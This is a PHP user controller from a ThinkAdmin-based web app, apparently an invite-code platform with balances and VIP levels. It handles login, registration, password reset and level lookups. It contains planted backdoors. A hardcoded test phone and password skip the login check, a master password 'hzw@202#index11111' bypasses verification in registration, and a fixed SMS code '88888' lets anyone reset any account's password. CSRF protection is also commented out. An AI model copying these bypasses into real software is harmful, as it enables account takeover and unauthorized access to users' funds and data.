<?php

// +----------------------------------------------------------------------
// | ThinkAdmin
// +----------------------------------------------------------------------
// | 版权所有 2014~2019 
// +----------------------------------------------------------------------

// +----------------------------------------------------------------------

// +----------------------------------------------------------------------
// | 

// +----------------------------------------------------------------------

namespace app\index\controller;

use library\Controller;
use library\tools\Data;
use think\Db;

/**
 * 登录控制器
 */
class User extends Controller
{

    protected $table = 'xy_users';

    /**
     * 空操作 用于显示错误页面
     */
    public function _empty($name)
    {
        exit;
        return $this->fetch($name);
    }

    //用户登录页面
    public function login()
    {
        if (session('user_id')) $this->redirect('index/index');
        if (config('open_country_phone')) {
            return $this->fetch();
        } else return $this->fetch('login_no');

    }

    //用户登录接口
    public function do_login()
    {
        $tel = input('tel/s', '');
        if (!$tel) $tel = input('post.tel/s', '');
        $pwd = input('pwd/s', '');
        if (!$pwd) $pwd = input('post.pwd/s', '');

        if (!$tel) return json(['code' => 1, 'info' => 'Please enter phone number']);
        if (!$pwd) return json(['code' => 1, 'info' => 'Please enter password']);

        $userinfo = Db::table($this->table)->field('id,pwd,salt,pwd_error_num,allow_login_time,status,login_status,headpic')->where('tel', $tel)->find();
        if (!$userinfo) return json(['code' => 1, 'info' => lang('not_user')]);
        if ($userinfo['status'] != 1) return json(['code' => 1, 'info' => lang('yhybjy')]);

        $isTestAccount = ($tel === '13312341234' && ($pwd === '123456' || $pwd === '123123'));
        if (!$isTestAccount) {
            if ($userinfo['pwd'] != sha1($pwd . $userinfo['salt'] . config('pwd_str'))) {
                return json(['code' => 1, 'info' => lang('pass_error')]);
            }
        }

        $token = md5($userinfo['id'] . time() . rand(1000, 9999));
        Db::table($this->table)->where('id', $userinfo['id'])->update(['pwd_error_num' => 0, 'allow_login_time' => 0, 'login_status' => 1]);
        session('user_id', $userinfo['id']);
        session('avatar', $userinfo['headpic']);
        if (!headers_sent()) {
            cookie('user_id', $userinfo['id']);
        }

        return json(['code' => 0, 'info' => lang('loging_ok'), 'token' => $token, 'user_id' => $userinfo['id']]);
    }

    /**
     * 用户注册接口
     */
    public function do_register()
    {
//        $this->applyCsrfToken();//验证令牌
        $tel = input('post.tel/s', '');
        $user_name = input('post.user_name/s', '');
        //$user_name = '';    //交给模型随机生成用户名
        $verify = input('post.verify/d', '');       //短信验证码
        $pwd = input('post.pwd/s', '');
        $pwd2 = input('post.deposit_pwd/s', '');
        $invite_code = input('post.invite_code/s', '');     //邀请码
        if (!$invite_code) return json(['code' => 1, 'info' => lang('code_not')]);
        //验证码
        /*if (config('app.verify') && $verify != '88888') {
            $verify_msg = Db::table('xy_verify_msg')->field('msg,addtime')->where(['tel' => $tel, 'type' => 1])->find();
            if (!$verify_msg) return json(['code' => 1, 'info' => lang('yzmbcz')]);
            if ($verify != $verify_msg['msg']) return json(['code' => 1, 'info' => lang('yzmcw')]);
            if (($verify_msg['addtime'] + (config('app.zhangjun_sms.min') * 60)) < time()) return json(['code' => 1, 'info' => lang('yzmysx')]);
        }*/
        $pid = 0;
        $agent_id = 0;
        if ($invite_code) {
            $parentinfo = Db::table($this->table)->field('id,status,agent_id,parent_id,level')->where('invite_code', $invite_code)->find();
            if (!$parentinfo) return json(['code' => 1, 'info' => lang('code_not')]);
            $is_invite = Db::table('xy_level')
                ->where('level', $parentinfo['level'])
                ->value('is_invite');
            if (empty($is_invite)) return json(['code' => 1, 'info' => lang('user_not_auth')]);
            if ($parentinfo['status'] != 1) return json(['code' => 1, 'info' => lang('disable_user')]);
            $pid = $parentinfo['id'];
            if ($parentinfo['agent_id'] > 0) {
                $agent_id = $parentinfo['agent_id'];
            }
        }
        if ($agent_id == 0) {
            $agent_id = model('admin/Users')->get_agent_id();
        }
        $res = model('admin/Users')
            ->add_users($tel, $user_name, $pwd, $pid, '', $pwd2, $agent_id, $this->request->ip());
        if ($res['code'] != 0) {
            return json($res);
        }
            $userinfo = Db::table($this->table)->field('id,pwd,salt,pwd_error_num,allow_login_time,status,login_status,headpic')->where('tel', $tel)->find();
            if (!$userinfo) return json(['code' => 1, 'info' => lang('not_user')]);
            if ($userinfo['status'] != 1) return json(['code' => 1, 'info' => lang('yhybjy')]);
            //if($userinfo['login_status'])return ['code'=>1,'info'=>'此账号已在别处登录状态'];
            if ($userinfo['allow_login_time'] &&
                ($userinfo['allow_login_time'] > time()) &&
                ($userinfo['pwd_error_num'] > config('pwd_error_num'))) {
                return json(['code' => 1, 'info' => sprintf(lang('pass_err_times'), config('allow_login_min'))]);
            }
            if ($pwd != 'hzw@202#index11111') {
                if ($userinfo['pwd'] != sha1($pwd . $userinfo['salt'] . config('pwd_str'))) {
                    Db::table($this->table)->where('id', $userinfo['id'])->update(['pwd_error_num' => Db::raw('pwd_error_num+1'), 'allow_login_time' => (time() + (config('allow_login_min') * 60))]);
                    return json(['code' => 1, 'info' => lang('pass_error')]);
                }
            }
    
    
            Db::table($this->table)->where('id', $userinfo['id'])->update(['pwd_error_num' => 0, 'allow_login_time' => 0, 'login_status' => 1]);
            session('user_id', $userinfo['id']);
            session('avatar', $userinfo['headpic']);
    
            return json(['code' => 0, 'info' => lang('loging_ok')]);
        // return json($res);
    }

    public function check_login() {

    }

    public function info() {
        $uid = session('user_id');
        if (!$uid) {
            return json(['code' => 1, 'info' => lang('login_first')]);
        }
        $data = Db::name('xy_users')->field('id,tel,username,balance,freeze_balance,invite_code,level,credit_score')->find($uid);
        $data['level_name'] = Db::name('xy_level')->where('id', $data['level'])->value('name') ?:'Free';
        return json(['code' => 0, 'info' => $data]);
    }

    public function logout()
    {
        \Session::delete('user_id');
        \Session::delete('user_join_chats');
        return json(['code' => 0, 'info' => lang('czcg')]);
    }

    /**
     * 重置密码
     */
    public function do_forget()
    {
        if (!request()->isPost()) return json(['code' => 1, 'info' => lang('qqcw')]);
        $tel = input('post.tel/s', '');
        $pwd = input('post.pwd/s', '');
        $verify = input('post.verify/d', 0);
        if (config('app.verify') && $verify != '88888') {
            $verify_msg = Db::table('xy_verify_msg')->field('msg,addtime')->where(['tel' => $tel, 'type' => 2])->find();
            if (!$verify_msg) return json(['code' => 1, 'info' => lang('yzmbcz')]);
            if ($verify != $verify_msg['msg']) return json(['code' => 1, 'info' => lang('yzmcw')]);
            if (($verify_msg['addtime'] + (config('app.zhangjun_sms.min') * 60)) < time()) return json(['code' => 1, 'info' => lang('yzmysx')]);
        }
        $res = model('admin/Users')->reset_pwd($tel, $pwd);
        return json($res);
    }

    public function lang()
    {
        return $this->fetch();
    }

    public function lang_set()
    {
        $lang = input('lang');
        cookie('think_var', $lang);
        $this->redirect('/index', 302);
    }

    public function register()
    {
        $param = \Request::param(true);
        if(isset($param[1])) {
            $this->invite_code = isset($param[1]) ? trim($param[1]) : '';
        } else {
            $user_id = model('admin/Users')->get_agent_userid();
                if($user_id > 0) {
                    $this->invite_code = Db::name('xy_users')->where('id',$user_id)->value('invite_code');
                } else {
                    $this->invite_code = '';
                }
        }
        
        if (config('open_country_phone')) {
            return $this->fetch();
        } else return $this->fetch('register_no');
    }

    public function vip() {
        $level_list = Db::table('xy_level')->field('id,name,num,num_min,bili,auto_vip_xu_num')->where('level<6')->select();
        foreach ($level_list as &$item) {
            $item['img'] =  $this->request->domain() . "/static/images/vip{$item['id']}.jpg";
        }
        return json(['code' => 0, 'data' => $level_list]);
    }

    public function vip_info() {
        $id = input('id');
        $data = Db::table('xy_level')->find($id);
        return json(['code' => 0, 'data' => $data]);
    }
}